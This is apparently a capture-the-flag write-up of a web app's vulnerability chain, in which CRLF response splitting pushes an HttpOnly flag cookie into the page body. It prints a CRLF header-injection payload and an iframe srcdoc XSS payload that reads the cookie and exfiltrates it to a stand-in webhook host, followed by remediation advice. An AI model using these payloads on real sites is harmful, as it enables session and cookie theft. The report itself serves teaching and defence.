> Historical assessment excerpt. Team attribution must be retained.

## Report

### Summary

The `Report` application exposed a critical vulnerability chain involving HTTP Response Splitting (via CRLF injection) and Stored DOM Cross-Site Scripting (XSS). Instead of properly sanitizing user input reflected in HTTP headers, the application allowed arbitrary carriage return (`\r`) and line feed (`\n`) characters in the `name` parameter. Simultaneously, the application's client-side sanitizer failed to filter `iframe srcdoc` payloads in the `content` parameter.

By chaining these two vulnerabilities, an attacker could force the server to push an `HttpOnly` cookie (containing the sensitive flag) from the HTTP response headers down into the readable HTML body. The accompanying XSS payload could then read this cookie as plain text from the DOM and exfiltrate it, entirely bypassing the `HttpOnly` security flag.

### Exploitation

The vulnerable behaviour originated from two distinct endpoints acting together when an administrator (or headless bot) viewed a submitted report at `/view/<uuid>`.

First, the application reflected the reported employee's `name` inside a custom HTTP response header (`X-Meta`). Because this input was not sanitized for control characters, an attacker could inject CRLF characters to prematurely terminate the HTTP headers and begin a forged response body.

HTTP

```
Fred\r\nX-Injected: yes\r\n\r\n
```

*Listing 1: CRLF payload used in the `name` parameter*

> This payload injects a carriage return and line feed sequence. By sending `\r\n\r\n`, it signals the end of the HTTP headers to the victim's browser. Any original server headers that follow this sequence—such as `Set-Cookie: flag=...; HttpOnly`—are consequently interpreted by the browser as part of the visible page content (the DOM body) rather than protected HTTP headers.

Second, the `content` parameter was rendered dynamically on the client side. The custom `sanitize` function only blacklisted specific tags (like `<script>` and `<object>`) and event handlers, but failed to restrict the `srcdoc` attribute of `<iframe>` tags. This permitted arbitrary JavaScript execution.

A malicious payload was crafted to read the page's text (which now contained the leaked `HttpOnly` cookie due to the response splitting) and exfiltrate it to an external server:

HTML

```
<iframe srcdoc="&lt;script&gt;try{let t=top.document.body.innerText||'';let m=t.match(/Set-Cookie: flag=([^;\n]+)/);if(m){(new Image()).src='https://lab.example.invalid'+encodeURIComponent(m[1])+'&dec='+encodeURIComponent(atob(m[1]));}}catch(e){(new Image()).src='https://lab.example.invalid'+encodeURIComponent(String(e));}&lt;/script&gt;"></iframe>
```

*Listing 2: Stored DOM XSS payload used in the `content` parameter*

> This payload uses an `iframe` with a `srcdoc` attribute to execute JavaScript. It reads `top.document.body.innerText`, uses a regular expression to extract the Base64-encoded flag that was forced into the DOM by the CRLF injection, decodes it, and sends it to an attacker-controlled webhook via an Image request.

Once the report was generated and visited by the automated bot, the payload executed successfully, bypassing mTLS and HttpOnly protections. The webhook received the exfiltrated data containing the decoded flag:

```
dec=[LAB_FLAG_REMOVED]
```

[Original screenshot omitted from this review copy.]

*Listing 3: Output captured at the external webhook showing successful flag disclosure*

> This shows that the combination of HTTP Response Splitting and Stored XSS was enough to move the `HttpOnly` cookie into readable page content and extract it.

### Remediation

The most critical fix is to address the CRLF injection. The application must strictly validate and sanitize any user-controlled input before reflecting it in HTTP response headers. Carriage return (`\r`, `%0d`) and line feed (`\n`, `%0a`) characters must be stripped or encoded. Modern web frameworks often prevent this by default, so ensuring the underlying HTTP library or framework is securely configured is essential.

Secondly, the custom client-side sanitization logic should be replaced with a robust, well-tested library such as DOMPurify. Blacklisting specific tags is inherently flawed. The sanitizer must strip dangerous elements like `iframe` and potentially dangerous attributes like `srcdoc`.

As a defence-in-depth measure, the application should implement a strict Content Security Policy (CSP). A properly configured CSP would prevent inline script execution and block the browser from sending data to unauthorized external domains (e.g., `webhook.site`), thereby neutralizing the exfiltration stage of the attack.

### Impact and Risk

The impact of this vulnerability chain is critical. On its own, the Stored DOM XSS would not have been sufficient to steal the flag, as the target cookie was marked as `HttpOnly` and inaccessible via `document.cookie`. However, the inclusion of the CRLF vulnerability allowed the attacker to fundamentally manipulate the HTTP protocol structure, stripping the `HttpOnly` protection by turning the cookie into plain text within the DOM.

The likelihood of exploitation is high since the attack requires no user interaction other than the victim (or administrator bot) viewing the submitted report. In this challenge, that was enough to disclose protected session data that should not have been accessible to client-side code.
